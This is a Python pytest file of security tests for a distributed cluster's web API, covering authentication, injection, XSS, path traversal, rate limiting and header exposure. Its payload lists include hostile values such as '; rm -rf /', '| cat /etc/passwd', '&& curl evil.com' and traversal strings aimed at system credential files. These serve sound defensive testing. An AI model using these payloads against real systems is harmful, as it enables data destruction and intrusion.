"""
API Security Tests
==================

Security tests for the API endpoints.
"""

import pytest


class TestAuthenticationSecurity:
    """Authentication security tests."""

    @pytest.mark.asyncio
    async def test_missing_auth_header(self):
        """Test requests without authentication header."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            # Protected endpoints should require auth
            protected_endpoints = [
                "/api/v1/admin/config",
                "/api/v1/admin/users",
            ]

            for endpoint in protected_endpoints:
                response = await client.get(endpoint)
                # Should return 401 or 403, not 200
                assert response.status_code in [401, 403, 404], f"Endpoint {endpoint} should require authentication"

    @pytest.mark.asyncio
    async def test_invalid_token(self):
        """Test requests with invalid authentication token."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            headers = {"Authorization": "Bearer invalid_token_12345"}
            response = await client.get("/api/v1/admin/config", headers=headers)
            assert response.status_code in [401, 403, 404]

    @pytest.mark.asyncio
    async def test_expired_token(self):
        """Test requests with expired token."""
        from datetime import datetime, timedelta, timezone

        import jwt
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        # Create an expired token
        expired_token = jwt.encode(
            {
                "sub": "test_user",
                "exp": datetime.now(timezone.utc) - timedelta(hours=1),
            },
            "wrong_secret",
            algorithm="HS256",
        )

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            headers = {"Authorization": f"Bearer {expired_token}"}
            response = await client.get("/api/v1/admin/config", headers=headers)
            assert response.status_code in [401, 403, 404]


class TestInputValidation:
    """Input validation security tests."""

    @pytest.mark.asyncio
    async def test_sql_injection_attempt(self):
        """Test SQL injection prevention."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        sql_payloads = [
            "'; DROP TABLE jobs; --",
            "1' OR '1'='1",
            "1; DELETE FROM workers WHERE 1=1",
            "' UNION SELECT * FROM users --",
            "admin'--",
        ]

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            for payload in sql_payloads:
                # Try in query parameters
                response = await client.get(f"/api/v1/jobs?search={payload}")
                # Should not cause server error
                assert response.status_code != 500, f"SQL injection caused server error: {payload}"

                # Try in job submission
                response = await client.post(
                    "/api/v1/jobs", json={"command": payload, "resources": {"cpu_cores": 1, "memory_mb": 512}}
                )
                assert response.status_code != 500, f"SQL injection in job caused server error: {payload}"

    @pytest.mark.asyncio
    async def test_xss_prevention(self):
        """Test XSS prevention."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "'\"><script>alert('xss')</script>",
        ]

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            for payload in xss_payloads:
                response = await client.post(
                    "/api/v1/jobs",
                    json={
                        "command": f"echo {payload}",
                        "resources": {"cpu_cores": 1, "memory_mb": 512},
                        "environment": {"XSS_TEST": payload},
                    },
                )
                # Should not reflect unescaped payload
                if response.status_code == 200:
                    content = response.text
                    assert "<script>" not in content or "alert(" not in content

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test command injection prevention."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "`whoami`",
            "$(id)",
            "\n/bin/sh",
        ]

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            for payload in injection_payloads:
                response = await client.post(
                    "/api/v1/jobs",
                    json={"command": f"echo test{payload}", "resources": {"cpu_cores": 1, "memory_mb": 512}},
                )
                # Command should be handled safely (validated or sandboxed)
                assert response.status_code != 500

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self):
        """Test path traversal prevention."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        traversal_payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00.txt",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ]

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            for payload in traversal_payloads:
                response = await client.get(f"/api/v1/artifacts/{payload}")
                # Should not allow path traversal
                assert response.status_code in [400, 403, 404], f"Path traversal not blocked: {payload}"


class TestRateLimiting:
    """Rate limiting security tests."""

    @pytest.mark.asyncio
    async def test_rapid_requests(self):
        """Test handling of rapid requests."""
        import asyncio

        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            # Send rapid requests
            tasks = [client.get("/health") for _ in range(100)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)

            # Count responses (even if rate limited)
            success_count = sum(1 for r in responses if not isinstance(r, Exception) and r.status_code in [200, 429])

            # Should handle all requests (either success or rate limit)
            assert success_count == 100

    @pytest.mark.asyncio
    async def test_failed_login_rate_limit(self):
        """Test rate limiting on failed authentication attempts."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            # Attempt multiple failed logins
            for i in range(20):
                await client.post("/api/v1/auth/login", json={"username": "admin", "password": f"wrong_password_{i}"})

            # After many failures, should be rate limited or blocked
            # This is a security best practice check
            response = await client.post("/api/v1/auth/login", json={"username": "admin", "password": "another_wrong"})
            # Should either succeed, fail auth, or be rate limited (not error)
            assert response.status_code in [200, 401, 403, 404, 429]


class TestDataExposure:
    """Data exposure and information leakage tests."""

    @pytest.mark.asyncio
    async def test_error_messages_no_sensitive_info(self):
        """Test that error messages don't expose sensitive information."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            # Trigger various errors
            response = await client.get("/api/v1/jobs/nonexistent-id-12345")
            content = response.text.lower()

            # Should not expose:
            sensitive_patterns = [
                "traceback",
                "exception",
                "stack trace",
                "sql",
                "database",
                "/home/",
                "/var/",
                "password",
                "secret",
                "key",
            ]

            for pattern in sensitive_patterns:
                if response.status_code >= 400:
                    # Error responses should not contain these
                    assert (
                        pattern not in content or response.status_code == 404
                    ), f"Error response may expose sensitive info: {pattern}"

    @pytest.mark.asyncio
    async def test_no_server_version_header(self):
        """Test that server version is not exposed in headers."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            response = await client.get("/health")

            # Should not expose server implementation details
            dangerous_headers = ["X-Powered-By", "Server"]
            for header in dangerous_headers:
                value = response.headers.get(header, "")
                # If present, should not contain version info
                assert "uvicorn" not in value.lower()
                assert "fastapi" not in value.lower()


class TestSecurityHeaders:
    """Security headers tests."""

    @pytest.mark.asyncio
    async def test_cors_headers(self):
        """Test CORS headers configuration."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            # OPTIONS request for CORS preflight
            response = await client.options("/api/v1/jobs", headers={"Origin": "http://evil.com"})

            # Should not allow arbitrary origins in production
            allow_origin = response.headers.get("Access-Control-Allow-Origin", "")
            if allow_origin:
                # Should be specific origin or not present, not wildcard in prod
                # (Wildcard may be acceptable in dev)
                pass  # Log for review

    @pytest.mark.asyncio
    async def test_content_type_headers(self):
        """Test content-type headers are set correctly."""
        from httpx import ASGITransport, AsyncClient

        from distributed_cluster.web.api import create_app

        app = create_app()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            response = await client.get("/api/v1/cluster/status")
            content_type = response.headers.get("content-type", "")

            if response.status_code == 200:
                # JSON responses should have proper content-type
                assert "application/json" in content_type or response.status_code != 200
